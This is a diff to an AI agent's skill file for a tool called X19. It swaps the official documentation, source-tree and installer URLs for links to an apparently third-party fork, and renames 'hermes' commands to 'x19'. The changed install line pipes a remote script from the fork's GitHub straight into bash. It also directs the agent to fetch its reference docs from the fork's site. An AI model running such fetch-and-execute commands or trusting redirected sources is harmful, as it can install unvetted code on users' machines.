@@ -45,7 +45,7 @@ What makes X19 different:
 
 **This skill is a hub.** The body covers identity, quick start, spawning/orchestration, and hard invariants. Everything else lives in reference files — **load the matching reference (below) before answering**; do not answer detail questions from the body alone.
 
-**Docs:** https://x19.nousresearch.com/docs/
+**Docs:** https://anony-place.github.io/x19-refactored/docs/
 
 ## Scope & Verification
 
@@ -53,9 +53,9 @@ This skill is a concise operating guide, not the complete source of truth for ev
 
 Good verification targets, cheapest first:
 
-- **Every shipped feature, one line each: https://x19.nousresearch.com/docs/llms.txt.** Start here for any "can X19 do X?" or "how do I do X?" — it indexes the entire documentation set with a link to the page that answers. It is generated from the docs tree on every build, so it is never behind the product. Fetch it with `web_extract`, or `curl -s https://x19.nousresearch.com/docs/llms.txt` when web tools are off. The whole documentation set in one file is at `/docs/llms-full.txt`.
+- **Every shipped feature, one line each: https://anony-place.github.io/x19-refactored/docs/llms.txt.** Start here for any "can X19 do X?" or "how do I do X?" — it indexes the entire documentation set with a link to the page that answers. It is generated from the docs tree on every build, so it is never behind the product. Fetch it with `web_extract`, or `curl -s https://anony-place.github.io/x19-refactored/docs/llms.txt` when web tools are off. The whole documentation set in one file is at `/docs/llms-full.txt`.
 - CLI commands: `x19 --help`, `x19 <command> --help`, and `x19_cli/main.py`
-- Source tree: https://github.com/NousResearch/x19
+- Source tree: https://github.com/Anony-place/x19-refactored
 
 Never answer "X19 can't do that" from memory. X19 ships far more than this skill body describes, and the index exists so a negative answer is always checkable.
 
@@ -63,10 +63,10 @@ Never answer "X19 can't do that" from memory. X19 ships far more than this skill
 
 ```bash
 # Install (shell installer — sets up uv, Python, the venv, and the launcher)
-curl -fsSL https://x19.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/Anony-place/x19-refactored/main/scripts/install.sh | bash
 
 # Interactive chat (default surface; set display.interface: tui to launch the Ink TUI instead)
-hermes
+x19
 
 # Single query
 x19 chat -q "What is the capital of France?"
@@ -105,13 +105,13 @@ Profiles use `~/.x19/profiles/<name>/` with the same layout. When a profile is a
 
 | User wants... | Load |
 |---|---|
-| **Anything not listed below — "can X19 do X?", "how do I set up X?"** | **https://x19.nousresearch.com/docs/llms.txt** |
+| **Anything not listed below — "can X19 do X?", "how do I set up X?"** | **https://anony-place.github.io/x19-refactored/docs/llms.txt** |
 | Bots that chat, run routines, or message each other; the Bots tab | docs: `/user-guide/bot-mode` |
 | CLI commands, subcommands, flags, "how do I run X" | `references/cli-reference.md` |
 | In-session slash commands | `references/slash-commands.md` |
 | Provider setup, API keys, OAuth | `references/providers-and-models.md` |
 | config.yaml sections, toolsets, voice/STT/TTS | `references/configuration.md` |
-| AGENTS.md / .hermes.md / CLAUDE.md project rules | `references/project-context-files.md` |
+| AGENTS.md / .x19.md / CLAUDE.md project rules | `references/project-context-files.md` |
 | Secret redaction, PII, approval modes, "reset permissions" | `references/security-privacy.md` |
 | Delegation, cron, curator, kanban | `references/background-systems.md` |
 | MCP servers (add, catalog, `x19 mcp`) | `references/native-mcp.md` |
@@ -162,7 +162,7 @@ X19 uses prompt_toolkit, which requires a real terminal. Use tmux for interactiv
 
 ```
 # Start
-terminal(command="tmux new-session -d -s agent1 -x 120 -y 40 'hermes'", timeout=10)
+terminal(command="tmux new-session -d -s agent1 -x 120 -y 40 'x19'", timeout=10)
 
 # Wait for startup, then send a message
 terminal(command="sleep 8 && tmux send-keys -t agent1 'Build a FastAPI auth service' Enter", timeout=15)
@@ -226,5 +226,5 @@ terminal(command="tmux new-session -d -s resumed 'x19 --resume 20260225_143052_a
 - **Never break prompt caching** — don't change past context, toolsets, or the system prompt mid-conversation. The only exception is context compression.
 - **Message role alternation** — never two assistant or two user messages in a row; only `tool` results can repeat.
 - **Secrets in `.env`, settings in `config.yaml`** — never tell a user to put a non-credential setting in `.env`.
-- **Profile-safe paths** — `get_hermes_home()` in code, `$X19_HOME` when resolving paths in a session.
+- **Profile-safe paths** — `get_x19_home()` in code, `$X19_HOME` when resolving paths in a session.
 - **Never hand-edit `config.yaml` for the user** — use `x19 config set KEY VAL`; a stray indent can corrupt the file and break the live gateway.
